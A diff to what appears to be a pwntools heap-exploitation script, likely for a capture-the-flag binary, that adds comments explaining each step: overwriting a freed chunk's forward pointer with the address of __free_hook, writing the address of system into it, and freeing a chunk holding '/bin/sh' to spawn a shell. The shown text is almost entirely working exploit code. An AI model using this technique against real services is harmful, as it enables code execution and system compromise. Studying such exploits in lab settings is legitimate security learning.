@@ -72,7 +72,7 @@ p.sendlineafter(b'index: ', b'4') # index
 p.sendlineafter(b'> ', b'2') # create
 p.sendlineafter(b'index: ', b'5') # index
 
-#edit last freed
+#edit last freed - Overwrite fd with &__free_hook
 p.sendlineafter(b'> ', b'3') # create
 p.sendlineafter(b'index: ', b'5') # index
 p.sendlineafter(b'data: ', p64(free_hook)) #  Data
@@ -84,7 +84,7 @@ p.sendlineafter(b'index: ', b'6') # index
 p.sendlineafter(b'size: ', b'32')
 p.sendlineafter(b'data: ', b'small5') #  Data
 
-p.sendlineafter(b'> ', b'1') # create
+p.sendlineafter(b'> ', b'1') # create - free_hook overwritten by system
 p.sendlineafter(b'index: ', b'7') # index
 p.sendlineafter(b'size: ', b'32')
 p.sendlineafter(b'data: ', p64(system)) #  Data
@@ -95,7 +95,7 @@ p.sendlineafter(b'size: ', b'32')
 p.sendlineafter(b'data: ', p64(binsh)) #  Data
 
 
-#free last one
+#free last one - does system(binsh)
 p.sendlineafter(b'> ', b'2') # create
 p.sendlineafter(b'index: ', b'8') # index
 
